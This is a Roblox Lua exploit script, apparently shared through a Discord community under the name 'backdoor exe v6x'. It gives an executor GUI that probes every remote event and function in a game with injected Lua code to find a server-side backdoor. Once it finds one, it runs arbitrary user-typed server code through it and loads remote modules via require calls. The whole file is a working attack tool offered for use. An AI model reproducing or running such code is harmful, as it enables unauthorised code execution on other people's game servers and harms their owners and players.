--[[
██████╗░░█████╗░░█████╗░██╗░░██╗██████╗░░█████╗░░█████╗░██████╗░
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██████╦╝███████║██║░░╚═╝█████═╝░██║░░██║██║░░██║██║░░██║██████╔╝
██╔══██╗██╔══██║██║░░██╗██╔═██╗░██║░░██║██║░░██║██║░░██║██╔══██╗
██████╦╝██║░░██║╚█████╔╝██║░╚██╗██████╔╝╚█████╔╝╚█████╔╝██║░░██║
╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝

--------------------------------------------------------------------------
	Invite Discord Server : discord.com/invite/Gnabm6WfhA 
	source script : backdoor exe v6x (@ik4os)
--------------------------------------------------------------------------
]]

local CollectionService = game:GetService("CollectionService")
local TextService = game:GetService("TextService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local JointsService = game:GetService("JointsService")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
local dateTimeNow = DateTime.now
local tableFind = table.find
local taskSpawn = task.spawn
local taskWait = task.wait
local stringRep = string.rep
local mathRandom = math.random
local attached = false;
local backdoor = nil;
local commonPlaces = {
	ReplicatedStorage,
	Workspace,
	Lighting
};
local remoteCodes = {};
local STRING_VALUE_NAME = mathRandom(1000000, 9999999);

-- gui

local LMG2L = {};
LMG2L["ScreenGui_1"] = Instance.new("ScreenGui")
LMG2L["ScreenGui_1"].Parent = game.CoreGui
LMG2L["ScreenGui_1"]["Enabled"] = true;
LMG2L["ScreenGui_1"]["DisplayOrder"] = 9999999999999999999999999999999999999999999999999999999999999999;
LMG2L["ScreenGui_1"]["AutoLocalize"] = false;
LMG2L["ScreenGui_1"]["Name"] = [[discord.com/invite/Gnabm6WfhA]];
LMG2L["Frame_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["Frame_2"]["BorderSizePixel"] = 0;
LMG2L["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(56, 56, 56);
LMG2L["Frame_2"]["Size"] = UDim2.new(0, 0, 0, 32);
LMG2L["Frame_2"]["Position"] = UDim2.new(0, 18, 0, -56);
LMG2L["UIDragDetector_a"] = Instance.new("UIDragDetector", LMG2L["Frame_2"]);
LMG2L["UIDragDetector_a"]["DragUDim2"] = UDim2.new(0, 32, 0, 479);
LMG2L["TextButton2_3"] = Instance.new("TextButton", LMG2L["Frame_2"]);
LMG2L["TextButton2_3"]["TextWrapped"] = true;
LMG2L["TextButton2_3"]["BorderSizePixel"] = 0;
LMG2L["TextButton2_3"]["TextScaled"] = true;
LMG2L["TextButton2_3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton2_3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton2_3"]["BackgroundTransparency"] = 9;
LMG2L["TextButton2_3"]["Size"] = UDim2.new(0, 34, 0, 26);
LMG2L["TextButton2_3"]["Text"] = [[X]];
LMG2L["TextButton2_3"]["Name"] = [[TextButton2]];
LMG2L["TextButton2_3"]["Position"] = UDim2.new(0, 428, 0, 4);
LMG2L["minize_4"] = Instance.new("Frame", LMG2L["Frame_2"]);
LMG2L["minize_4"]["BorderSizePixel"] = 0;
LMG2L["minize_4"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
LMG2L["minize_4"]["Size"] = UDim2.new(0, 462, 0, 0);
LMG2L["minize_4"]["Position"] = UDim2.new(0, 0, 0, 32);
LMG2L["minize_4"]["Name"] = [[minize]];
LMG2L["log_Slog_5"] = Instance.new("Frame", LMG2L["minize_4"]);
LMG2L["log_Slog_5"]["BackgroundColor3"] = Color3.fromRGB(42, 42, 42);
LMG2L["log_Slog_5"]["Size"] = UDim2.new(0, 454, 0, 298);
LMG2L["log_Slog_5"]["Position"] = UDim2.new(0, 4, 0, 6);
LMG2L["log_Slog_5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["log_Slog_5"]["Name"] = [[log_Slog]];
LMG2L["TextButton2_6"] = Instance.new("TextButton", LMG2L["log_Slog_5"]);
LMG2L["TextButton2_6"]["TextWrapped"] = true;
LMG2L["TextButton2_6"]["TextSize"] = 20;
LMG2L["TextButton2_6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton2_6"]["BackgroundColor3"] = Color3.fromRGB(44, 44, 44);
LMG2L["TextButton2_6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Balthazar.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["TextButton2_6"]["Size"] = UDim2.new(0, 102, 0, 34);
LMG2L["TextButton2_6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["TextButton2_6"]["Text"] = [[Clear]];
LMG2L["TextButton2_6"]["Name"] = [[TextButton2]];
LMG2L["TextButton2_6"]["Position"] = UDim2.new(0, 100, 0, 258);
LMG2L["TextButton5_7"] = Instance.new("TextButton", LMG2L["log_Slog_5"]);
LMG2L["TextButton5_7"]["TextWrapped"] = true;
LMG2L["TextButton5_7"]["TextSize"] = 20;
LMG2L["TextButton5_7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton5_7"]["BackgroundColor3"] = Color3.fromRGB(44, 44, 44);
LMG2L["TextButton5_7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Balthazar.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["TextButton5_7"]["Size"] = UDim2.new(0, 62, 0, 34);
LMG2L["TextButton5_7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["TextButton5_7"]["Text"] = [[R6]];
LMG2L["TextButton5_7"]["Name"] = [[TextButton5]];
LMG2L["TextButton5_7"]["Position"] = UDim2.new(0, 330, 0, 258);
LMG2L["TextButton4_8"] = Instance.new("TextButton", LMG2L["log_Slog_5"]);
LMG2L["TextButton4_8"]["TextWrapped"] = true;
LMG2L["TextButton4_8"]["TextSize"] = 20;
LMG2L["TextButton4_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton4_8"]["BackgroundColor3"] = Color3.fromRGB(44, 44, 44);
LMG2L["TextButton4_8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Balthazar.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["TextButton4_8"]["Size"] = UDim2.new(0, 56, 0, 34);
LMG2L["TextButton4_8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["TextButton4_8"]["Text"] = [[RE]];
LMG2L["TextButton4_8"]["Name"] = [[respawn]];
LMG2L["TextButton4_8"]["Position"] = UDim2.new(0, 392, 0, 258);
LMG2L["TextButton3_9"] = Instance.new("TextButton", LMG2L["log_Slog_5"]);
LMG2L["TextButton3_9"]["TextWrapped"] = true;
LMG2L["TextButton3_9"]["TextSize"] = 20;
LMG2L["TextButton3_9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton3_9"]["BackgroundColor3"] = Color3.fromRGB(44, 44, 44);
LMG2L["TextButton3_9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Balthazar.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["TextButton3_9"]["Size"] = UDim2.new(0, 96, 0, 34);
LMG2L["TextButton3_9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["TextButton3_9"]["Text"] = [[Scan]];
LMG2L["TextButton3_9"]["Name"] = [[Inject]];
LMG2L["TextButton3_9"]["Position"] = UDim2.new(0, 202, 0, 258);
LMG2L["TextButton_a"] = Instance.new("TextButton", LMG2L["log_Slog_5"]);
LMG2L["TextButton_a"]["TextWrapped"] = true;
LMG2L["TextButton_a"]["TextSize"] = 20;
LMG2L["TextButton_a"]["Name"] = [[Exe]];
LMG2L["TextButton_a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton_a"]["BackgroundColor3"] = Color3.fromRGB(44, 44, 44);
LMG2L["TextButton_a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Balthazar.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["TextButton_a"]["Size"] = UDim2.new(0, 96, 0, 34);
LMG2L["TextButton_a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["TextButton_a"]["Text"] = [[Execute ]];
LMG2L["TextButton_a"]["Position"] = UDim2.new(0, 4, 0, 258);
LMG2L["ScrollingFrame_b"] = Instance.new("ScrollingFrame", LMG2L["log_Slog_5"]);
LMG2L["ScrollingFrame_b"]["BackgroundColor3"] = Color3.fromRGB(42, 42, 42);
LMG2L["ScrollingFrame_b"]["Size"] = UDim2.new(0, 444, 0, 246);
LMG2L["ScrollingFrame_b"]["Position"] = UDim2.new(0, 4, 0, 4);
LMG2L["ScrollingFrame_b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["Servertext_c"] = Instance.new("TextBox", LMG2L["ScrollingFrame_b"]);
LMG2L["Servertext_c"]["Name"] = [[Servertext]];
LMG2L["Servertext_c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["Servertext_c"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Servertext_c"]["BorderSizePixel"] = 0;
LMG2L["Servertext_c"]["TextSize"] = 15;
LMG2L["Servertext_c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Servertext_c"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LMG2L["Servertext_c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Servertext_c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["Servertext_c"]["AutomaticSize"] = Enum.AutomaticSize.XY;
LMG2L["Servertext_c"]["MultiLine"] = true;
LMG2L["Servertext_c"]["ClearTextOnFocus"] = false;
LMG2L["Servertext_c"]["Size"] = UDim2.new(0, 448, 0, 290);
LMG2L["Servertext_c"]["Text"] = [[-- https://discord.gg/Gnabm6WfhA]];
LMG2L["Servertext_c"]["BackgroundTransparency"] = 1;
LMG2L["TextLabel2_d"] = Instance.new("TextLabel", LMG2L["Frame_2"]);
LMG2L["TextLabel2_d"]["TextWrapped"] = true;
LMG2L["TextLabel2_d"]["BorderSizePixel"] = 0;
LMG2L["TextLabel2_d"]["TextSize"] = 33;
LMG2L["TextLabel2_d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["TextLabel2_d"]["TextStrokeColor3"] = Color3.fromRGB(181, 3, 255);
LMG2L["TextLabel2_d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextLabel2_d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Italic);
LMG2L["TextLabel2_d"]["TextColor3"] = Color3.fromRGB(98, 10, 255);
LMG2L["TextLabel2_d"]["BackgroundTransparency"] = 8;
LMG2L["TextLabel2_d"]["Size"] = UDim2.new(0, 170, 0, 28);
LMG2L["TextLabel2_d"]["Text"] = [[Backdoor]];
LMG2L["TextLabel2_d"]["Name"] = [[TextLabel2]];
LMG2L["TextLabel2_d"]["Position"] = UDim2.new(0, 77, 0, 2);
LMG2L["TextLabel_e"] = Instance.new("TextLabel", LMG2L["Frame_2"]);
LMG2L["TextLabel_e"]["TextWrapped"] = true;
LMG2L["TextLabel_e"]["BorderSizePixel"] = 0;
LMG2L["TextLabel_e"]["TextSize"] = 32;
LMG2L["TextLabel_e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["TextLabel_e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextLabel_e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Italic);
LMG2L["TextLabel_e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextLabel_e"]["BackgroundTransparency"] = 8;
LMG2L["TextLabel_e"]["Size"] = UDim2.new(0, 214, 0, 28);
LMG2L["TextLabel_e"]["Text"] = [[Yoliz  -]];
LMG2L["TextLabel_e"]["Position"] = UDim2.new(0, 4, 0, 2);
LMG2L["TextButton_f"] = Instance.new("TextButton", LMG2L["Frame_2"]);
LMG2L["TextButton_f"]["TextWrapped"] = true;
LMG2L["TextButton_f"]["BorderSizePixel"] = 0;
LMG2L["TextButton_f"]["TextScaled"] = true;
LMG2L["TextButton_f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton_f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["TextButton_f"]["BackgroundTransparency"] = 9;
LMG2L["TextButton_f"]["Size"] = UDim2.new(0, 34, 0, 28);
LMG2L["TextButton_f"]["Text"] = [[_]];
LMG2L["TextButton_f"]["Position"] = UDim2.new(0, 400, 0, 0);
LMG2L["log_Slog_5"]["Visible"] = false;
LMG2L["TextLabel2_d"]["Visible"] = false;
LMG2L["TextLabel_e"]["Visible"] = false;
LMG2L["TextButton_f"]["Visible"] = false;
LMG2L["TextButton2_3"]["Visible"] = false;

-- notify

local function notify(text)
	game:GetService("StarterGui"):SetCore(
		"SendNotification",{
			Title = "Yoliz - .gg/Gnabm6WfhA",
			Duration = 3,
			Text = text,
			Icon = "rbxassetid://111390379645237"
		}
	)
end

-- function 

wait(0.4)
local tweenInfo = TweenInfo.new(
	0.5, 
	Enum.EasingStyle.Quad,
	Enum.EasingDirection.Out
)

	local tween = TweenService:Create(LMG2L["Frame_2"], tweenInfo, {
		Size = UDim2.new(0, 462, 0, 32)
	})
	tween:Play()
	tween.Completed:Wait() 
wait(0.5)
LMG2L["TextLabel2_d"]["Visible"] = true
LMG2L["TextLabel_e"]["Visible"] = true
LMG2L["TextButton_f"]["Visible"] = true
LMG2L["TextButton2_3"]["Visible"] = true
wait(0.1)
local tweenInfo = TweenInfo.new(
	0.6, 
	Enum.EasingStyle.Quad,
	Enum.EasingDirection.Out
)

if not LMG2L["log_Slog_5"].Visible then
	local tween = TweenService:Create(LMG2L["minize_4"], tweenInfo, {
		Size = UDim2.new(0, 462, 0, 308)
	})
	tween:Play()
	tween.Completed:Wait() 
wait(0.1)
LMG2L["log_Slog_5"].Visible = true
end

LMG2L["TextButton_f"].MouseButton1Click:Connect(function()
local tweenInfo = TweenInfo.new(
	0.6, 
	Enum.EasingStyle.Quad,
	Enum.EasingDirection.Out
)

if LMG2L["log_Slog_5"].Visible then
LMG2L["log_Slog_5"].Visible = false
	local tween = TweenService:Create(LMG2L["minize_4"], tweenInfo, {
		Size = UDim2.new(0, 462, 0, 0)
	})
	tween:Play()
	tween.Completed:Wait() 
else
	local tween = TweenService:Create(LMG2L["minize_4"], tweenInfo, {
		Size = UDim2.new(0, 462, 0, 308)
	})
	tween:Play()
 wait(0.5)
	LMG2L["log_Slog_5"].Visible = true
end
end)

LMG2L["TextButton2_3"].MouseButton1Click:Connect(function()

local frame = LMG2L["minize_4"]
local log = LMG2L["log_Slog_5"]

local tweenInfo = TweenInfo.new(
	0.6, 
	Enum.EasingStyle.Quad,
	Enum.EasingDirection.Out
)

if log.Visible then
log.Visible = false
	local tween = TweenService:Create(frame, tweenInfo, {
		Size = UDim2.new(0, 462, 0, 0)
	})
	tween:Play()
	tween.Completed:Wait() 
end
wait(0.4)
LMG2L["TextButton2_3"]:Destroy()
LMG2L["TextLabel2_d"]:Destroy()
LMG2L["TextLabel_e"]:Destroy()
LMG2L["TextButton_f"]:Destroy()
wait(0.2)
local frame = LMG2L["Frame_2"]
local tweenInfo = TweenInfo.new(
	0.5, 
	Enum.EasingStyle.Quad,
	Enum.EasingDirection.Out
)

	local tween = TweenService:Create(frame, tweenInfo, {
		Size = UDim2.new(0, 0, 0, 32)
	})
	tween:Play()
	tween.Completed:Wait() 
wait(0.7)
LMG2L["ScreenGui_1"]:Destroy()
LMG2L["ScreenGui_1"]:Remove()
end)

local function validRemote(rm)
	local Parent = rm.Parent
	local class = rm.ClassName
	if class ~= "RemoteEvent" and class ~= "RemoteFunction" and class ~= "BindableEvent"  and class ~= "BindableFunction" then return false end

	if Parent then
		if Parent == JointsService then return false end
		if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
        (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
	end

	if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end

	return true
end

local function scanDescendants(parent)
	local descendance = parent:GetDescendants();
	for i=1, #descendance do
		local descendant = descendance[i];


		if not validRemote(descendant) then continue; end
		
		--if #remoteCodes == 5 then remoteCodes.clear(); end
		local remoteCode = tostring(mathRandom(100000, 999999));
		remoteCodes[remoteCode] = descendant;
		
		local remoteClass = descendant.ClassName
		local requireScript = ("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'"):format(STRING_VALUE_NAME, remoteCode)

		if remoteClass == "RemoteEvent" then
			descendant:FireServer(requireScript)

		elseif remoteClass == "RemoteFunction" then
			local waiting = true
			taskSpawn(function()
				descendant:InvokeServer(requireScript)
				waiting = nil
			end)


			local start = dateTimeNow().UnixTimestampMillis
			while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
				taskWait()
			end
		end

		if Workspace:FindFirstChild(STRING_VALUE_NAME) then
			attached = true
			backdoor = remoteCodes[Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
			backdoor:FireServer(("game.Workspace['%s']:Destroy()"):format(STRING_VALUE_NAME)) -- Cleaning up after tonumberselves

			return true
		end
	end
end
local function scanGame()
    local found = false

	for i=1, #commonPlaces do
		local place = commonPlaces[i];
		if scanDescendants(place) then
            found = true
        end
	end

	local children = game:GetChildren();
	for i=1, #children do
		local child = children[i];
		if tableFind(commonPlaces, child) then continue; end
		
		if scanDescendants(child) then 
            found = true
        end
	end
    if found then
        notify("Backdoored/Injected!")
    end
    if not found then
        notify("Unable to find backdoor, If it doesn't work, game not backdoored")
    end

	return found;
end

LMG2L["TextButton3_9"].MouseButton1Click:Connect(function()
pcall(scanGame)
wait(2)
if not attached then
if scanGame() then
notify("PlaceId : " .. tostring(game.PlaceId))
end
end
end)

LMG2L["TextButton2_6"].MouseButton1Click:Connect(function()
LMG2L["Servertext_c"]["Text"] = [[]]
end)

LMG2L["TextButton5_7"].MouseButton1Click:Connect(function()
    if attached then
    if backdoor.ClassName == "RemoteEvent" then
        backdoor:FireServer([[require(9635947635).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
    elseif backdoor.ClassName == "RemoteFunction" then
        backdoor:InvokeServer([[require(9635947635).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
    elseif backdoor.ClassName == "BindableEvent" then
        backdoor:FireServer([[require(9635947635).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
    elseif backdoor.ClassName == "BindableFunction" then
        backdoor:InvokeServer([[require(9635947635).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
    end
    end
end)

LMG2L["TextButton4_8"].MouseButton1Click:Connect(function()
    if attached then
    if backdoor.ClassName == "RemoteEvent" then
        backdoor:FireServer([[require(3229910984):respawn("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
    elseif backdoor.ClassName == "RemoteFunction" then
        backdoor:InvokeServer([[require(3229910984):respawn("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
    elseif backdoor.ClassName == "BindableEvent" then
        backdoor:FireServer([[require(3229910984):respawn("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
    elseif backdoor.ClassName == "BindableFunction" then
        backdoor:InvokeServer([[require(3229910984):respawn("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
    end
    end
end)

LMG2L["TextButton_a"].MouseButton1Click:Connect(function()
if LMG2L["Servertext_c"].Text ~= "" then	
pcall(function()	
    if attached then
    if backdoor.ClassName == "RemoteEvent" then
        backdoor:FireServer(LMG2L["Servertext_c"].Text)
    elseif backdoor.ClassName == "RemoteFunction" then
        backdoor:InvokeServer(LMG2L["Servertext_c"].Text)
    elseif backdoor.ClassName == "BindableEvent" then
        backdoor:FireServer(LMG2L["Servertext_c"].Text)
    elseif backdoor.ClassName == "BindableFunction" then
        backdoor:InvokeServer(LMG2L["Servertext_c"].Text)
    end
    end
	end)	
	end
end)

local Source = LMG2L["Servertext_c"]
local function NewLayer(name,color,z)
	local t = Instance.new("TextLabel")
	t.Name = name
	t.Parent = Source
	t.BackgroundTransparency = 1
	t.Size = UDim2.new(1,0,1,0)
	t.Position = UDim2.new(0,0,0,0)
	t.Font = Enum.Font.Code
	t.TextSize = Source.TextSize
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.TextYAlignment = Enum.TextYAlignment.Top
	t.TextWrapped = false
	t.RichText = false
	t.ZIndex = z
	t.TextColor3 = color
	t.Text = ""
	return t
end

local Comments_ = NewLayer("Comments_", Color3.fromRGB(100,100,100), 10)
local Globals_ = NewLayer("Globals_", Color3.fromRGB(69, 155, 247), 10)
local Keywords_ = NewLayer("Keywords_", Color3.fromRGB(248, 92, 92), 5)
local RemoteHighlight_ = NewLayer("RemoteHighlight_", Color3.fromRGB(0,144,255), 5)
local Strings_ = NewLayer("Strings_", Color3.fromRGB(145, 246, 67), 10)
local Tokens_ = NewLayer("Tokens_", Color3.fromRGB(200, 200, 200), 5)
local Numbers_ = NewLayer("Numbers_", Color3.fromRGB(255, 184, 0), 6)

local lua_keywords = {
	"and","break","do","else","elseif","end","false",
	"for","function","goto","if","in","local","nil",
	"not","or","repeat","return","then","true","until",
	"while","pcall","wait","Value","Play","Playing","Destroy"
}

local global_env = {"a","b","c","d","e","f","g","h","i","j","k","l","m","h","i","j","m","n","o","p","q","r","s","t","u","v","u","x","y","z","game", "Lighting", "TimeOfDay", "hookmetamethod", "hookfunction", "getgc", "filtergc", "Drawing", "getgenv", "getsenv", "getrenv", "getfenv", "local", "setfenv", "decompile", "saveinstance", "getrawmetatable", "setrawmetatable", "checkcaller", "cloneref", "clonefunction", "iscclosure", "islclosure", "isexecutorclosure", "newcclosure", "getfunctionhash", "crypt", "writefile", "appendfile", "loadfile", "readfile", "listfiles","makefolder", "isfolder", "isfile", "delfile", "delfolder", "getcustomasset", "fireclickdetector", "firetouchinterest","fireproximityprompt","getrawmetatable","game","workspace","script","math","string","table","print","wait","BrickColor","Color3","next","pairs","ipairs","select","unpack","Instance","Vector2","Vector3","CFrame","Ray","UDim2","Enum","assert","error","warn","tick","loadstring","_G","shared","getfenv","setfenv","newproxy","setmetatable","getmetatable","os","debug","pcall","ypcall","xpcall","rawequal","rawset","rawget","tonumber","tostring","type","typeof","_VERSION","coroutine","delay","require","spawn","LoadLibrary","settings","stats","time","UserSettings","version","Axes","ColorSequence","Faces","ColorSequenceKeypoint","NumberRange","NumberSequence","NumberSequenceKeypoint","gcinfo","elapsedTime","collectgarbage","PhysicalProperties","Rect","Region3","Region3int16","UDim","Vector2int16","Vector3int16","task","RiseVelocity","Opacity","VelocityInheritance","WindAffectsDrag","TimeScale","LockedToPart","Acceleration","ShapeStyle","ShapeInOut","SpreadAngle","Speed","RotSpeed","Rate","Lifetime","EmissionDirection","ZOffset","Squash","Volume","Brightness","PantsTemplate","ShirtTemplate","BackSurface","BottomSurface","LeftSurface","RightSurface","TopSurface","FrontSurface","MoonTextureId","TextureId","SkyboxBk","SkyboxDn","SkyboxFt","SkyboxLf","SkyboxRt","SkyboxUp","StarCount","SunAngularSize","SunTextureId","MeshType","VertexColor","CastShadow","PivotOffset","WorldPivot","Size","Position","CFrame","SoundId","Name","BrickColor","Color","Transparency","Orientation","Anchored","Rotation","Health","DisplayName","C0","C1","Part0","Part1","MeshId","Texture","Face","ZIndex","DisplayDistanceType","RigType","WalkSpeed","MaxHealth","HipHeight","Disabled","Enabled","JumpPower","Text","BackgroundColor","TextColor3","BorderColor3","Scale","Offset","Active","PrimaryPart","Reflectance","Massless","CanCollide","Material","Shape","CollisionGroup","CanTouch","BinType","ExtentsOffset","MaxDistance","ResetOnSpawn","SizeOffset","StudsOffset","AnchorPoint","AutomaticSize","BackgroundTransparency","LayoutOrder","BorderMode","BorderSizePixel","Active","SizeConstraint","Visible","Image","ImageColor3","ImageRectSize","ImageRectOffset","ImageTransparency","ResampleMode","ScaleType","AlwaysOnTop","Brightness","PlayerToHideFrom"}


local function Highlight(text, keywords)
	local K = {}

	for _,v in ipairs(keywords) do
		K[v] = true
	end

	local Token = {
		["="]=true,["."]=true,[","]=true,
		["("]=true,[")"]=true,["["]=true,
		["]"]=true,["{"]=true,["}"]=true,
		[":"]=true,["*"]=true,["/"]=true,
		["+"]=true,["-"]=true,["%"]=true,
		[";"]=true,["~"]=true
	}

	local S = text

	S = S:gsub(".",function(c)
		return Token[c] and " " or c
	end)

	S = S:gsub("%S+",function(c)
		return K[c] and c or (" "):rep(#c)
	end)

	return S
end

local function hTokens(text)
	local Token = {
		["="]=true,["."]=true,[","]=true,
		["("]=true,[")"]=true,["["]=true,
		["]"]=true,["{"]=true,["}"]=true,
		[":"]=true,["*"]=true,["/"]=true,
		["+"]=true,["-"]=true,["%"]=true,
		[";"]=true,["~"]=true
	}

	local A = ""

	text:gsub(".",function(c)
		if Token[c] then
			A = A .. c
		elseif c == "\n" then
			A = A .. "\n"
		else
			A = A .. " "
		end
	end)

	return A
end

local function strings(text)
	local highlight = ""
	local quote = false

	text:gsub(".",function(c)
		if c == "\"" then
			quote = not quote
			highlight = highlight .. "\""
		elseif quote then
			highlight = highlight .. c
		elseif c == "\n" then
			highlight = highlight .. "\n"
		else
			highlight = highlight .. " "
		end
	end)

	return highlight
end

local function comments(text)
	local ret = ""

	for line in (text.."\n"):gmatch("(.-)\n") do
		local pos = line:find("%-%-")

		if pos then
			ret = ret .. (" "):rep(pos-1) .. line:sub(pos)
		else
			ret = ret .. (" "):rep(#line)
		end

		ret = ret .. "\n"
	end

	return ret
end

local function numbers(text)
	local A = ""

	text:gsub(".",function(c)
		if tonumber(c) then
			A = A .. c
		elseif c == "\n" then
			A = A .. "\n"
		else
			A = A .. " "
		end
	end)

	return A
end

local function UpdateHighlight()
	local s = Source.Text

	Keywords_.Text = Highlight(s,lua_keywords)
	Globals_.Text = Highlight(s,global_env)
	RemoteHighlight_.Text = Highlight(s,{
		"FireServer",
		"InvokeServer"
	})

	Tokens_.Text = hTokens(s)
	Numbers_.Text = numbers(s)
	Strings_.Text = strings(s)
	Comments_.Text = comments(s)
end

Source:GetPropertyChangedSignal("Text"):Connect(UpdateHighlight)
UpdateHighlight()

local function updateCanvasSize()
    local textSize = LMG2L["Servertext_c"].TextBounds


    LMG2L["Servertext_c"].Size = UDim2.new(
        0, math.max(textSize.X + 10, 239),
        0, math.max(textSize.Y + 10, 239)
    )


    LMG2L["ScrollingFrame_b"].CanvasSize = UDim2.new(
        0, LMG2L["Servertext_c"].Size.X.Offset,
        0, LMG2L["Servertext_c"].Size.Y.Offset
    )
end

LMG2L["Servertext_c"]:GetPropertyChangedSignal("Text"):Connect(updateCanvasSize)
LMG2L["Servertext_c"].Focused:Connect(updateCanvasSize)
LMG2L["Servertext_c"].FocusLost:Connect(updateCanvasSize)

updateCanvasSize()

return LMG2L["ScreenGui_1"]
